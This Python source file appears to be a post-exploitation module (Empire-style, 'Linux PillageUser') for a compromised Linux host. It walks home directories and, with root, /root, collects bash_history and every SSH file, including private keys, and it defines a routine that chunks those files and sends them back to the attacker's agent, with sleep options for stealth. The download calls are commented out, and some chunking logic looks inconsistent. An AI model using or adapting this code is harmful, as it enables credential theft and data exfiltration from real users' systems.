class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Linux PillageUser',

            # list of one or more authors for the module
            'Author': ['@harmj0y'],

            # more verbose multi-line description of the module
            'Description': ("Pillages the current user for their bash_history, ssh known hosts, "
                            "recent folders, etc. "),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Sleep' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   "Switch. Sleep the agent's normal interval between downloads, otherwise use one blast.",
                'Required'      :   False,
                'Value'         :   'True'
            },
            'AllUsers' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   "Switch. Run for all users (needs root privileges!)",
                'Required'      :   False,
                'Value'         :   'False'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        sleep = self.options['Sleep']['Value']
        allUsers = self.options['AllUsers']['Value']

        script = """
import os
# custom function to send downloac packets back
def downloadFile(path):
    import os
    filePath = os.path.expanduser(path)

    if os.path.isfile(filePath):

        offset = 0
        size = os.path.getsize(filePath)

        while True:

            partIndex = 0

            # get 512kb of the given file starting at the specified offset
            encodedPart = get_file_part(filePath, offset)

            partData = "%%s|%%s|%%s" %%(partIndex, filePath, encodedPart)

            if not encodedPart or encodedPart == '': break

            sendMessage(encodePacket(41, partData))

            # if we're choosing to sleep between file part downloads
            if "%(sleep)s".lower() == "true":
                global minSleep
                global maxSleep
                minSleep = (1.0-jitter)*delay
                maxSleep = (1.0+jitter)*delay
                sleepTime = random.randint(minSleep, maxSleep)
                time.sleep(sleepTime)

            partIndex += 1
            offset += 5120000

searchPaths = ['/.bash_history']

if "%(allUsers)s".lower() == "true":
    d='/home/'
    userPaths = [os.path.join(d,o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
    userPaths += ["/root/"]
else:
    userPaths = ['~/']

for userPath in userPaths:
    for searchPath in searchPaths:
        #downloadFile(userPath + searchPath)
        print userPath + searchPath

    # grab all .ssh files
    filePath = os.path.expanduser(userPath + '/.ssh/')
    if os.path.exists(filePath):
        sshFiles = [f for f in os.listdir(filePath) if os.path.isfile(os.path.join(filePath, f))]
        for sshFile in sshFiles:
            # downloadFile(userPath + '/.ssh/' + sshFile)
            print userPath + '/.ssh/' + sshFile

print "pillaging complete"
""" % {'sleep': sleep, 'allUsers': allUsers}

        return script
